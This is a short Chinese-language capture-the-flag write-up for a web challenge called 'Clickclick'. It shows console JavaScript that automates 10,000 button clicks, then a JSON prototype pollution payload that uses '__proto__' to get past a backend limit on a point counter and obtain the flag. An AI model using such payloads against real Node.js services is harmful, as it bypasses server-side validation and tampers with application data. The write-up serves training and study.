# Clickclick

题目提示：按钮按到一万次有提示。 

按钮按一万次并不难，选中元素复制js即可：

```javascript
document.querySelector("#app > main > div > button")
```

然后就在控制台里面重复运行：

```javascript
but = document.querySelector("#app > main > div > button")
for (var i = 0; i < 10000; i++) {
    but.click();
}
```

出现两行提示：

```js
什么叫“前后端分离”啊？（战术后仰）

if ( req.body.point.amount == 0 || req.body.point.amount == null) { delete req.body.point.amount }

```

其中第一行是按下 1000 次的提示，第二行是按下 10000 次的提示。注意到第二行的提示代码是 javascript， 查看网络请求，发现每 50 次发送一次请求，格式如下：

```json
{
  "type": "set",
  "point": {
    "amount": 700
  }
}
```

然后到达 1000 次以后，响应错误，提示按钮过快。实际上后端直接禁止了 1000 次 以后的请求，所以我们的 `amount` 值就不可以为 1000 次以后的值。结合后端语言为 `javascript` ，考虑原型链污染。

当 `amount` 值被设置为 0 的时候，后端会删除响应中的这个值。因此，我们直接设置为 0 ，并且污染原型：

```json
{
  "type": "set",
  "point": {
    "amount": 0,
    "__proto__": {
      "amount": 10000
    }
  },
}
```

请求后刷新一下，即可得到 flag